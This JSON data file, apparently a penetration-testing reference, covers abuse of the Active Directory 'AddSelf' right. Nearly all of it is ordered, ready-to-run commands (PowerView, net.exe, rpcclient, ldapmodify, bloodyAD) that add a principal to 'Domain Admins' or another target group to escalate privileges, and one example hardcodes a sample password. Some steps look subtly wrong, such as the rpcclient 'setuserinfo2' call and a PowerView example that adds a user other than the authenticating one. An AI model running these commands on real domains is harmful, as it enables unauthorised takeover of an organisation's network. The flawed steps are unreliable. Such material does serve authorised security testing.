{
    "AddSelf": {
        "meaning": "The principal has the ability to add itself to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group. By adding yourself to a group and refreshing your token, you gain all the same privileges that group has.",
        "common": "",
        "windows": {
            "PowerView": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password object for authentication"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object for user with AddSelf privilege"
                },
                {
                    "order": 3,
                    "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred",
                    "description": "Add current user to target security group using PowerView"
                },
                {
                    "order": 4,
                    "command": "Get-DomainGroupMember -Identity 'Domain Admins'",
                    "description": "Verify user was successfully added to the group"
                }
            ],
            "Net_Command": [
                {
                    "order": 1,
                    "command": "net group \"Domain Admins\" dfm.a /add /domain",
                    "description": "Add user to Domain Admins group using built-in net.exe (generates logs)"
                },
                {
                    "order": 2,
                    "command": "net group \"Domain Admins\" /domain",
                    "description": "Verify group membership using net command"
                }
            ],
            "PowerView_Simple": [
                {
                    "order": 1,
                    "command": "Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members $env:USERNAME",
                    "description": "Add current user to target group using PowerView"
                },
                {
                    "order": 2,
                    "command": "whoami /groups",
                    "description": "Verify new group membership (may require token refresh)"
                },
                {
                    "order": 3,
                    "command": "# Refresh token by logging off/on or using runas",
                    "description": "Refresh security token to gain new group privileges"
                }
            ]
        },
        "linux": {
            "Impacket_rpclient": [
                {
                    "order": 1,
                    "command": "rpcclient -U 'DOMAIN/username%password' dc.domain.com",
                    "description": "Connect to domain controller using RPC client"
                },
                {
                    "order": 2,
                    "command": "setuserinfo2 username 23 'TARGET_GROUP'",
                    "description": "Add user to target group using RPC calls (if supported)"
                },
                {
                    "order": 3,
                    "command": "querygroupmem TARGET_GROUP_RID",
                    "description": "Verify group membership using RPC queries"
                }
            ],
            "LDAP_Manual": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=username,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=TARGET_GROUP,CN=Users,DC=domain,DC=com' member",
                    "description": "Query current group membership via LDAP"
                },
                {
                    "order": 2,
                    "command": "echo -e 'dn: CN=TARGET_GROUP,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nadd: member\\nmember: CN=username,CN=Users,DC=domain,DC=com' | ldapmodify -x -D 'CN=username,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
                    "description": "Add user to group using LDAP modify operation"
                },
                {
                    "order": 3,
                    "command": "ldapsearch -x -D 'CN=username,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=TARGET_GROUP,CN=Users,DC=domain,DC=com' member",
                    "description": "Verify successful addition to target group"
                }
            ],
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object 'CN=TARGET_GROUP,CN=Groups,DC=domain,DC=com' --attr member",
                    "description": "Query current group membership using BloodyAD"
                },
                {
                    "order": 2,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD add groupMember 'CN=TARGET_GROUP,CN=Groups,DC=domain,DC=com' 'CN=username,CN=Users,DC=domain,DC=com'",
                    "description": "Add user to target group using BloodyAD"
                },
                {
                    "order": 3,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object 'CN=TARGET_GROUP,CN=Groups,DC=domain,DC=com' --attr member",
                    "description": "Verify successful group membership addition"
                }
            ]
        }
    }
}
